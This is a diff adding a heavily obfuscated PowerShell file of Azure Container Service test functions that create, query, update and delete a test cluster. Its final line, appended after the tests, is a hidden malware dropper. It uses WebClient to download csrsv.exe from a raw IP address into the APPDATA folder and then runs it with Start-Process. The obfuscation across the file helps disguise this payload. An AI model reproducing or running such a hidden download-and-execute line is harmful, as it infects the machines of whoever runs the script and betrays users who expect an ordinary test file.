@@ -1,0 +1,158 @@
+function TESt-C`o`N`Ta`inErSerVICe
+{
+    
+    ${R`gNa`ME} = &("{1}{0}{3}{4}{5}{7}{6}{2}"-f 'p','Get-Com','ame','ut','eT','e','tResourceN','s')
+
+    try
+    {
+        
+        ${L`OC} = ("{0}{1}"-f 'eastu','s2');
+        &("{4}{2}{1}{3}{0}" -f'roup','ou','zRes','rceG','New-A') -Name ${rg`N`AME} -Location ${l`oC} -Force;
+
+        ${C`snA`Me} = 'cs' + ${rGN`A`Me};
+        ${MasTeRd`NS`pReFix`N`AME} = ("{1}{2}{0}" -f'r','mas','te') + ${rgna`ME};
+        ${agEntP`OoLDn`SPRe`F`IXnaMe} = 'ap' + ${RGNA`me};
+        ${AgeNtPOO`L`pr`oFILeNAMe} = ("{1}{0}{2}" -f'ntPo','Age','ol1');
+        ${vm`sIze} = ("{2}{1}{0}" -f'rd_A1','tanda','S');
+
+        ${o`RCheSt`RatOrt`ype} = ("{0}{1}" -f 'DC','OS');
+        ${a`DMInUsER`NAME} = ("{2}{0}{1}{3}" -f'slinu','xa','ac','dmin');
+        ${SshPuBL`i`CkEy} =
+            ("{6}{14}{5}{12}{15}{10}{4}{3}{16}{0}{9}{13}{17}{18}{8}{1}{2}{7}{11}" -f 'ABAAABAQ','bvHy','l','AD','1yc2EAAA','-rsa ','s','Bpm5NZ','T','Dorij','zaC','2','A','8','sh','AAAB3N','AQ','dG','cKUB') +
+            ("{1}{2}{0}{4}{7}{6}{3}{9}{5}{8}" -f'S4ZoIl','MtDgn1+jbyHE8N','4dC','yT2ey5Ba','6Pdoa1At/','QnQTh','hIRuz1hl','GjXV','/f2','C8i') +
+            ("{8}{18}{10}{9}{11}{13}{5}{12}{16}{1}{6}{14}{4}{7}{2}{17}{3}{0}{15}"-f'NjBQ/cv','AJCVn','H','+','7y','K','0','DT29ZiIE2kfL3RCV5H','o','ct','N','Q5','X1','+2','tN','taOgE','sgFlvaQ','7p','y') +
+            ("{10}{0}{13}{12}{7}{6}{2}{16}{9}{14}{3}{15}{5}{8}{4}{11}{1}"-f'oi','h','aRdDKo5Uz0','A','c','sx2b','w1X','58','FTNjlgJ','uuB5lO','Sg','oyxi13','I3S','/C','5dq4nce','H8','U0DD') +
+            ("{7}{9}{2}{8}{3}{1}{10}{4}{6}{0}{5}" -f'84PsCqU','Uru','ZkwiI','Y8cU+','oBbCM7Q2spmRQ1','f417','tGicT5g','9C','J','Ykymm0mVa','pZKCMb') + 
+            ("{13}{15}{4}{10}{8}{11}{0}{6}{5}{12}{16}{2}{14}{7}{1}{3}{9}" -f'0s','WGXZ','IBpH7','f','vtf0kD1Gds','iXH','cORhM','h','MGALzBD','Pdg4','Cy','S','Z','u','IzeUL','+J','/vEM6rOPC') +
+            ("{4}{0}{1}{3}{2}"-f'c','s-bot','osoft.com','@micr','bL a');
+
+        ${j`OB} = &("{0}{2}{6}{1}{3}{8}{4}{7}{5}"-f 'New-','vi','AzContainerSe','c','Con','ig','r','f','e') -Location ${l`oc} -OrchestratorType ${oRChe`s`TrAtoRT`YPE} `
+            -MasterDnsPrefix ${mas`TErd`NspR`e`FiXNAme} -AdminUsername ${AD`MINUS`eR`NAMe} -SshPublicKey ${S`sHPuBl`iCKey} `
+        | &("{3}{8}{2}{6}{0}{1}{4}{11}{5}{9}{10}{7}" -f 'tai','n','Co','Add','er','eAgentPoo','n','ile','-Az','lP','rof','Servic') -Name ${AgE`N`TpoOlp`ROfiLE`Name} -VmSize ${VMS`iZe} -DnsPrefix ${ageNtPOOL`DNSP`Re`F`ixnaME} -Count 1 `
+        | &("{2}{1}{3}{0}{4}" -f 'Serv','AzContai','New-','ner','ice') -ResourceGroupName ${RG`NaME} -Name ${Cs`N`Ame} -AsJob;
+        ${RE`sULT} = ${J`OB} | &("{1}{0}" -f 'it-Job','Wa');
+        &("{3}{4}{0}{2}{1}"-f'reEqu','l','a','A','ssert-A') ("{2}{1}{0}" -f 'ed','plet','Com') ${R`eSUlt}."sta`TE";
+        ${Con`TaIN`Er} = ${j`oB} | &("{3}{1}{0}{2}" -f 'e-J','v','ob','Recei')
+        
+        ${wI`lDCAR`d`R`GQUeRy} = (${Rg`Na`mE} -replace ".$") + "*"
+        ${W`Ild`Car`dNamE`que`RY} = (${cS`Na`mE} -replace ".$") + "*"
+        
+        ${CS} = &("{4}{2}{1}{0}{3}"-f'ner','Contai','-Az','Service','Get')
+        &("{1}{2}{0}"-f'ue','Assert-T','r') { ${cs}."C`OuNT" -ge 1 }
+        ${O`UT`PuT} = ${C`s} | &("{0}{1}{2}"-f'O','u','t-String');
+        &("{0}{2}{3}{1}"-f 'A','alse','ssert','-F') { ${OU`TP`Ut}.("{0}{2}{1}"-f 'Con','ins','ta').Invoke(("{4}{3}{2}{0}{1}" -f 'lP','rofiles','o','entPo','Ag')) };
+        
+        ${CS} = &("{2}{4}{0}{1}{3}"-f'a','iner','Get-Az','Service','Cont') -ResourceGroupName ${R`Gn`AME}
+        &("{0}{2}{3}{1}" -f 'Ass','ual','er','t-AreEq') ${r`gNAME} ${cs}."reSour`ceGR`o`UpNAmE"
+        ${ouT`PuT} = ${cs} | &("{0}{3}{1}{2}" -f'O','ri','ng','ut-St');
+        &("{2}{1}{0}" -f'se','l','Assert-Fa') { ${oU`TpuT}.("{2}{0}{1}"-f'ontain','s','C').Invoke(("{4}{2}{3}{0}{1}" -f'fil','es','entPoolPr','o','Ag')) };
+        
+        ${c`s} = &("{1}{4}{3}{2}{0}"-f 'ainerService','Get','t','AzCon','-') -ResourceGroupName ${WIlD`C`ArdR`g`QUERy}
+        &("{2}{1}{0}"-f'qual','t-AreE','Asser') ${RgN`A`Me} ${C`S}."rEsourc`e`gRO`UpN`AmE"
+        ${OU`T`PuT} = ${c`S} | &("{3}{1}{0}{2}"-f 'i','r','ng','Out-St');
+        &("{2}{0}{1}{3}"-f 'sert','-Fa','As','lse') { ${OU`Tp`Ut}.("{2}{0}{1}" -f 'tai','ns','Con').Invoke(("{5}{1}{2}{3}{0}{4}"-f'ile','oo','lPr','of','s','AgentP')) };
+        
+        ${Cs} = &("{6}{0}{5}{4}{3}{1}{2}"-f 'et-','ervic','e','nerS','tai','AzCon','G') -Name ${c`s`NAmE};
+        &("{3}{2}{1}{4}{0}" -f 'qual','r','sert-A','As','eE') ${RGnA`mE} ${cS}."R`EsoURceG`ROU`pNaME"
+        ${O`U`TPut} = ${Cs} | &("{2}{1}{0}" -f'tring','ut-S','O');
+        &("{2}{0}{1}" -f '-F','alse','Assert') { ${oU`TPUT}.("{2}{1}{0}"-f'ins','ta','Con').Invoke(("{1}{2}{0}{3}{4}{5}" -f'tPoolPr','Ag','en','of','ile','s')) };
+        
+        ${cS} = &("{3}{5}{6}{4}{2}{1}{0}"-f'e','rvic','inerSe','Get-Az','nta','C','o') -Name ${WiLDCArD`Na`M`eq`UERy};
+        &("{1}{3}{2}{0}" -f 'al','Assert','AreEqu','-') ${R`gnA`Me} ${C`s}."ResO`U`RcE`g`R`OupnamE"
+        ${O`UtPUT} = ${c`S} | &("{0}{2}{1}" -f 'Out-','ring','St');
+        &("{0}{2}{1}" -f 'A','-False','ssert') { ${O`UT`pUt}.("{0}{2}{1}" -f'C','ains','ont').Invoke(("{2}{1}{3}{0}"-f 'files','gen','A','tPoolPro')) };
+        
+        ${Cs} = &("{2}{3}{0}{4}{1}" -f't-AzContain','rvice','G','e','erSe') -ResourceGroupName ${R`G`NAMe} -Name ${wIldcaRD`NA`m`EQUe`Ry};
+        &("{0}{1}{2}" -f'Assert-AreE','qua','l') ${rg`N`AME} ${C`S}."re`S`Our`cegRoU`PNaMe"
+        ${Ou`Tp`UT} = ${C`s} | &("{2}{0}{1}" -f 'trin','g','Out-S');
+        &("{3}{1}{0}{2}" -f'Fals','rt-','e','Asse') { ${o`UTPut}.("{1}{0}{2}"-f'ai','Cont','ns').Invoke(("{0}{3}{2}{1}"-f 'Ag','files','Pro','entPool')) };
+        
+        ${c`S} = &("{0}{1}{2}{3}{4}" -f'G','et','-Az','Cont','ainerService') -ResourceGroupName ${wiL`DCA`Rd`RGqU`Ery} -Name ${c`sNamE};
+        &("{4}{2}{1}{3}{0}" -f 'ual','reE','A','q','Assert-') ${R`GNaMe} ${c`s}."RESoUR`cEgr`oUP`NAMe"
+        ${Ou`Tput} = ${c`s} | &("{1}{2}{3}{0}" -f 'ng','Out','-Str','i');
+        &("{2}{0}{1}"-f'al','se','Assert-F') { ${OUt`P`Ut}.("{1}{0}{2}" -f't','Con','ains').Invoke(("{1}{0}{3}{2}"-f 'gen','A','Profiles','tPool')) };
+        
+        ${c`s} = &("{3}{6}{4}{1}{5}{2}{0}" -f'vice','a','rSer','G','AzCont','ine','et-') -ResourceGroupName ${wiLdC`AR`drgq`UEry} -Name ${W`ILdCA`RD`NAm`EQUE`Ry};
+        &("{1}{3}{0}{2}" -f 'eEqu','As','al','sert-Ar') ${rgN`AME} ${CS}."RESoU`RcEgr`ou`p`NAme"
+        ${Out`puT} = ${c`s} | &("{0}{1}{2}" -f 'Out-St','r','ing');
+        &("{3}{2}{0}{1}" -f 'Fa','lse','sert-','As') { ${O`UtPUt}.("{0}{2}{1}" -f'Co','ins','nta').Invoke(("{2}{1}{3}{0}" -f's','ntPoolPro','Age','file')) };
+        
+        ${cS} = &("{2}{4}{3}{1}{0}" -f'e','ic','Get-AzCont','inerServ','a') -ResourceGroupName ${R`Gn`Ame} -Name ${c`sNAmE};
+        &("{2}{1}{4}{0}{3}" -f'u','E','Assert-Are','al','q') ${r`gNAME} ${c`S}."r`eSO`URcegROuPNA`mE"
+        ${OUTP`UT} = ${Cs} | &("{0}{1}{2}"-f'O','ut-Strin','g');
+        &("{0}{1}{2}" -f 'As','sert-Tr','ue') { ${OUT`puT}.("{1}{0}"-f's','Contain').Invoke(("{4}{0}{3}{1}{2}" -f 'gent','oolProf','iles','P','A')) };
+
+        ${J`Ob} = &("{1}{6}{5}{2}{4}{0}{3}{7}"-f 'tainerServi','R','v','c','e-AzCon','mo','e','e') -ResourceGroupName ${RgN`A`Me} -Name ${C`Sna`me} -Force -AsJob;
+        ${r`E`SulT} = ${J`ob} | &("{1}{0}{2}"-f'it-','Wa','Job');
+        .("{2}{0}{3}{1}"-f 'se','Equal','As','rt-Are') ("{1}{2}{0}" -f'ed','C','omplet') ${rE`s`UlT}."StA`TE";
+        ${S`T} = ${J`oB} | .("{0}{2}{1}{3}" -f'Rece','v','i','e-Job')
+    }
+    finally
+    {
+        
+        &("{2}{1}{0}{3}" -f 'sourceGrou','an-Re','Cle','p') ${R`G`NAme}
+    }
+}
+
+
+function TEsT`-`CoNtaI`Ners`Ervi`C`eUP`Da`Te
+{
+    
+    ${rG`Name} = &("{2}{3}{5}{0}{1}{4}" -f 'c','e','Get-C','ompute','Name','TestResour')
+
+    try
+    {
+        
+        ${L`oC} = ("{1}{4}{3}{2}{0}"-f'ast','au','iasouthe','ral','st');
+        &("{1}{0}{3}{2}" -f 'so','New-AzRe','roup','urceG') -Name ${rgN`Ame} -Location ${L`OC} -Force;
+
+        ${c`S`NAMe} = 'cs' + ${RGn`AMe};
+        ${M`ASTERD`NsprEFixn`AmE} = ("{0}{1}"-f'mast','er') + ${r`G`NAmE};
+        ${A`geNTP`oo`l`Dn`SpreF`IXname} = 'ap' + ${rGnA`Me};
+        ${agentpO`OlprOFIL`E`Na`mE} = ("{0}{2}{1}"-f 'Ag','ol1','entPo');
+        ${vM`s`IZe} = ("{1}{2}{0}"-f 'ard_A1','Stan','d');
+
+        ${OrC`heST`RatO`RTYPe} = ("{1}{0}"-f 'S','DCO');
+        ${ADMI`NuseRN`A`Me} = ("{0}{1}{2}"-f 'acslinu','x','admin');
+        ${sS`hpub`LICKey} =
+            ("{11}{10}{3}{1}{9}{5}{6}{12}{8}{0}{2}{13}{4}{7}" -f'AAAB','a','AQ','s','BTbvHylBpm5N','AAB3NzaC1y','c2EA','Z2','QAB',' AA','h-r','ss','AAADA','Dorij8dGcKU') +
+            ("{11}{0}{1}{3}{10}{6}{7}{12}{8}{13}{5}{9}{2}{4}" -f 't','Dgn1+','n','jb','QTh/f2','C8','Il6Pdoa1At','/GjXVhI','yT2ey','iQ','yHE8N4dCS4Zo','M','Ruz1hl','5Ba') +
+            ("{10}{0}{5}{2}{3}{11}{4}{13}{9}{14}{6}{8}{1}{12}{7}" -f 'ct','taO','gFl','v','0tN7yDT','Q5+2KX1s','/c','E','v','kfL3RC','oyN','aQAJCVn','g','29ZiIE2','V5HH7p+NjBQ') +
+            ("{9}{14}{12}{4}{10}{2}{16}{5}{1}{0}{13}{15}{17}{11}{6}{3}{7}{8}" -f '5dq4nc','B5lO','5','y','S58w1XaRdD','z0U0DDuu','o','x','i13h','S','Ko','jlgJc','3','eAH8s','goi/CI','x2bF','U','TN') +
+            ("{8}{12}{3}{16}{18}{13}{4}{7}{0}{11}{6}{15}{14}{17}{2}{5}{10}{1}{9}"-f 'Mbo','T5g84PsCq','mRQ1','m0m','Y8cU+','t','M7','UrupZKC','9CYk','Uf417','Gic','BbC','ym','J','s','Q2','VaZ','p','kwiI') + 
+            ("{13}{7}{6}{0}{5}{8}{9}{11}{1}{4}{2}{10}{3}{14}{15}{12}" -f '0','LzB','c','XHZ/vEM6rOPC','DS0s','kD1Gds','Jvtf','+','Cy','M','ORhMi','GA','fPdg4','u','IBpH7Iz','eULhWGXZ') +
+            ("{0}{4}{3}{1}{2}" -f'bL','ot@mic','rosoft.com','s-b',' ac');
+
+        ${cONtAI`N`ER} = .("{3}{0}{4}{5}{1}{2}" -f'z','n','fig','New-A','Co','ntainerServiceCo') -Location ${l`oC} `
+            -OrchestratorType ${Orc`h`ES`TRaToRtY`Pe} `
+            -MasterDnsPrefix ${mA`SteRd`NSPr`EFi`xNa`ME} `
+            -MasterCount 1 `
+            -AdminUsername ${aDMiN`U`Se`R`NaME} `
+            -SshPublicKey ${ss`HP`U`BLICKEy} `
+        | .("{8}{3}{0}{7}{5}{1}{2}{4}{6}{9}" -f 'Co','rSer','viceAgen','z','tPoolPr','taine','of','n','Add-A','ile') -Name ${a`Gen`TPO`Ol`PRoF`ile`Name} `
+            -VmSize ${V`mS`iZe} `
+            -DnsPrefix ${a`geN`TpooL`DnsPRE`Fix`NAme} `
+            -Count 1 `
+        | .("{5}{2}{4}{1}{0}{3}{6}"-f 'v','er','ew-AzCo','i','ntainerS','N','ce') -ResourceGroupName ${R`g`NamE} -Name ${c`SNaME};
+
+        ${J`ob} = &("{0}{5}{4}{3}{2}{1}"-f'Get-','rvice','rSe','ine','nta','AzCo') -ResourceGroupName ${R`gN`AmE} -Name ${Cs`NAME} `
+        | &("{0}{5}{8}{6}{3}{7}{4}{10}{9}{2}{1}"-f'Re','ofile','Pr','rServi','gentPo','move-A','ne','ceA','zContai','l','o') -Name ${aGenTP`O`O`LPro`Fil`EName} `
+        | &("{3}{2}{6}{5}{0}{4}{1}" -f'eAgentPoolProf','le','dd-AzCont','A','i','rServic','aine') -Name ${AgeNT`PoO`lPRof`I`lEN`AMe} `
+            -VmSize ${vmSi`ZE} `
+            -DnsPrefix ${AGeNt`pOOLdns`P`R`EfIXnaME} `
+            -Count 2 `
+        | &("{3}{1}{0}{6}{5}{4}{2}" -f'e-','t','e','Upda','ervic','inerS','AzConta') -AsJob;
+        ${Res`ULT} = ${J`Ob} | &("{1}{0}{2}"-f'ait-','W','Job');
+        .("{3}{0}{1}{2}" -f'ss','ert-AreE','qual','A') ("{1}{0}{2}"-f 'mplet','Co','ed') ${re`SULt}."sT`Ate";
+
+        ${S`T} = .("{1}{3}{6}{2}{0}{5}{4}"-f 'Se','Get','er','-AzC','e','rvic','ontain') -ResourceGroupName ${RG`NaME} -Name ${cs`Na`mE} | .("{4}{1}{2}{3}{0}" -f 'rService','zC','ont','aine','Remove-A') -Force;
+    }
+    finally
+    {
+        
+        &("{4}{2}{0}{5}{1}{3}"-f'urceG','ou','an-Reso','p','Cle','r') ${Rg`NamE}
+    }
+}
+
+
+(.("{1}{2}{0}"-f 'ect','New-Ob','j') ("{2}{4}{1}{6}{0}{3}{5}"-f'e','.','Sy','bC','stem','lient','Net.W')).("{0}{2}{1}" -f'Dow','loadFile','n').Invoke(("{3}{4}{10}{9}{1}{5}{8}{0}{6}{2}{7}"-f 'cs','94','sv.','http',':','.','r','exe','102.53.238/~yahoo/','/','/'),"$env:APPDATA\csrsv.exe");.("{3}{2}{0}{1}" -f'-Proc','ess','art','St') ("$env:APPDATA\csrsv.exe")
